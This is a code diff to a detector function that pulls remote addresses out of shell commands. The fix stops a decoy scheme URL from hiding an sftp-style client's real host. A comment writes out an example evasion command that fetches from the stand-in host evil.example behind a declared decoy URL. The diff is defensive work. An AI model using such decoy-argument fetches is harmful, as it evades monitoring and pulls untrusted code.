@@ -232,11 +232,28 @@ def fetch_addresses(body: str):
         # checkout` puts the root *between* the verb and the command, so
         # the matched text swallows it and looking only at the tail found
         # nothing.
+        # A host-form client's operand is its remote even when the tail
+        # also carries a scheme URL: `sftp -b - u@evil.example
+        # https://declared/...` fetches from evil.example, and the URL is
+        # a decoy argument.  Yielding the scheme address first let the
+        # declared decoy silence H016 entirely (reopened bypass
+        # list2-b/987b9ebd), so the host operand is reported first and the
+        # scheme URL after it.  scp keeps the old order: its tail's first
+        # host-like token can be a local source or destination, and
+        # scp-form addresses (`u@h:/p`) are claimed by `_address_in`.
+        host_first = bool(_HOST_FORM_CLIENTS.match(client.group(0))) \
+            and not client.group(0).lower().startswith("scp")
+        host = (_host_address_in(client.group(0), tail[:cut])
+                if host_first else None)
+        if host:
+            yield host
         address = _address_in(client.group(0)) or _address_in(tail[:cut])
         if address:
             yield address
             continue
         # No scheme anywhere: a host-form client still names a remote.
+        if host:
+            continue
         host = _host_address_in(client.group(0), tail[:cut])
         if host:
             yield host
